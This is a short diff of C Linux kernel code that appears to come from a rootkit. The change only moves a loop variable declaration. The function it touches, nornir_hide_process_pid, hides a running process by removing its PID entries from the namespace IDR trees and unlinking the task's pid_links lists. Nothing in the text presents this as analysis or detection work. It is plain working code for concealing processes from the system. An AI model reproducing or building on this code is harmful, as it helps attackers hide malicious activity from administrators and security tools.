@@ -15,15 +15,16 @@
 void nornir_hide_process_pid(struct task_struct *task, struct pid *pid)
 {
     struct upid *upid;
+    int i;
 
     /* hide from pid's radix trie */
-    for (int i = 0; i < pid->level; i++) {
+    for (i = 0; i < pid->level; i++) {
         upid = pid->numbers + i;
         idr_remove(&upid->ns->idr, upid->nr);
     }
 
     /* hide from task_struct->pid_links */
-    for (int i = 0; i < PIDTYPE_MAX; i++) {
+    for (i = 0; i < PIDTYPE_MAX; i++) {
         hlist_del_rcu(&task->pid_links[i]);
         INIT_HLIST_NODE(&task->pid_links[i]);
     }
